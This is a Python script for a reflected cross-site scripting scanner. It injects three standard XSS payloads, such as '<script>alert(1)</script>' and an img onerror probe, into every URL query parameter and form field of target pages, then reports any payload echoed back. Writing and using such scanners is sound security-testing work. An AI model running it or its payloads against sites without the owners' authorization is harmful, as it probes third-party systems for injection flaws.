
import re
import time
import logging
from urllib.parse import urlparse, urlunparse, parse_qsl, urlencode, urljoin, urlsplit, urlunsplit
import requests
from bs4 import BeautifulSoup

# --- Configuration ---
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>'
]

# compile regexes escaping special chars from payloads (case-insensitive)
REFLECT_PATTERNS = [re.compile(re.escape(p), re.IGNORECASE) for p in XSS_PAYLOADS]

# time to sleep between requests (seconds)
SLEEP_SECONDS = 0.1

# logging config
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')


# --- Utility functions ---
def sleep(seconds=SLEEP_SECONDS):
    time.sleep(seconds)


def get_params(url):
    """
    Return a dict of query params for a given URL.
    """
    parsed = urlsplit(url)
    params = dict(parse_qsl(parsed.query, keep_blank_values=True))
    return params


def is_payload_reflected(body_text, patterns=REFLECT_PATTERNS):
    """
    Return True if any of the compiled patterns matches the response body.
    """
    for pat in patterns:
        if pat.search(body_text):
            return True
    return False


# --- Parameter scanning ---
def test_url_params(url, session=None):
    """
    Test each query parameter by replacing its value with each payload.
    Returns list of findings.
    """
    if session is None:
        session = requests.Session()

    findings = []
    params = get_params(url)
    if not params:
        logging.info("No query parameters to test for %s", url)
        return findings

    for param in list(params.keys()):
        for payload in XSS_PAYLOADS:
            # build URL with this param set to payload
            parsed = urlsplit(url)
            query_params = dict(parse_qsl(parsed.query, keep_blank_values=True))
            query_params[param] = payload
            new_query = urlencode(query_params, doseq=True)
            built = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, new_query, parsed.fragment))

            logging.info('Testing param "%s" with payload "%s" on %s', param, payload, built)
            try:
                resp = session.get(built, timeout=15, allow_redirects=True)
                body = resp.text
                if is_payload_reflected(body):
                    findings.append({
                        'type': 'param',
                        'endpoint': built,
                        'param': param,
                        'payload': payload,
                        'evidence': 'Payload reflected in response'
                    })
                sleep()
            except requests.RequestException as e:
                logging.error('Request failed: %s for URL: %s', str(e), built)
    return findings


# --- Form parsing and testing ---
def get_forms(url, session=None):
    """
    Fetch the URL and return a list of BeautifulSoup form tags.
    """
    if session is None:
        session = requests.Session()
    try:
        resp = session.get(url, timeout=15)
        html = resp.text
        soup = BeautifulSoup(html, 'html.parser')
        return soup.find_all('form')
    except requests.RequestException as e:
        logging.error('Failed to GET %s: %s', url, e)
        return []


def _get_default_value_for_input(elem):
    """
    Given a form input element (BeautifulSoup tag), return a reasonable default value.
    """
    tag_name = elem.name.lower()
    if tag_name == 'input':
        input_type = (elem.get('type') or '').lower()
        if input_type in ('checkbox', 'radio'):
            # if checked attribute present, keep value, else use 'on'
            return elem.get('value', 'on')
        if input_type in ('submit', 'button', 'image', 'file'):
            return elem.get('value', '')
        return elem.get('value', 'test')
    elif tag_name == 'textarea':
        return elem.text or 'test'
    elif tag_name == 'select':
        # try to return first option value
        option = elem.find('option', selected=True) or elem.find('option')
        if option:
            return option.get('value', option.text)
        return 'test'
    else:
        return 'test'


def test_forms(url, session=None):
    """
    Parse forms from URL and test submitted form inputs by injecting payloads.
    Returns list of findings.
    """
    if session is None:
        session = requests.Session()

    findings = []
    forms = get_forms(url, session=session)
    logging.info('Found %d form(s) on %s', len(forms), url)

    for form in forms:
        # resolve action (may be relative)
        action = form.get('action') or url
        action = urljoin(url, action)
        method = (form.get('method') or 'GET').upper()

        # build default form data from inputs
        form_data = {}
        elements = form.find_all(['input', 'textarea', 'select'])
        for elem in elements:
            name = elem.get('name')
            if not name:
                continue
            form_data[name] = _get_default_value_for_input(elem)

        # if no named inputs, skip
        if not form_data:
            logging.info('No named inputs found for form action %s', action)
            continue

        # iterate each input and payload
        for input_name in list(form_data.keys()):
            for payload in XSS_PAYLOADS:
                test_data = form_data.copy()
                test_data[input_name] = payload

                logging.info('Testing form action "%s" method "%s" input "%s" with payload "%s"',
                             action, method, input_name, payload)

                try:
                    if method == 'POST':
                        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                        resp = session.post(action, data=test_data, headers=headers, timeout=20, allow_redirects=True)
                    else:
                        # GET - build query params on action
                        parsed = urlsplit(action)
                        existing = dict(parse_qsl(parsed.query, keep_blank_values=True))
                        # merge test_data (stringify values)
                        merged = {**existing, **{k: v for k, v in test_data.items()}}
                        new_query = urlencode(merged, doseq=True)
                        get_url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path, new_query, parsed.fragment))
                        resp = session.get(get_url, timeout=20, allow_redirects=True)

                    body = resp.text
                    if is_payload_reflected(body):
                        findings.append({
                            'type': 'form',
                            'endpoint': action,
                            'param': input_name,
                            'payload': payload,
                            'evidence': 'Payload reflected in response'
                        })
                    sleep()
                except requests.RequestException as e:
                    logging.error('Form request failed: %s for action: %s', str(e), action)
    return findings


# --- High-level scan runner ---
def run_scan(urls):
    """
    Run scans for a list of URLs (strings). Returns consolidated list of findings.
    """
    session = requests.Session()
    all_findings = []

    for url in urls:
        logging.info('Scanning URL parameters on: %s', url)
        try:
            param_findings = test_url_params(url, session=session)
            all_findings.extend(param_findings)
        except Exception as e:
            logging.error('Error while testing params for %s: %s', url, e)

        logging.info('Scanning forms on: %s', url)
        try:
            form_findings = test_forms(url, session=session)
            all_findings.extend(form_findings)
        except Exception as e:
            logging.error('Error while testing forms for %s: %s', url, e)

    return all_findings

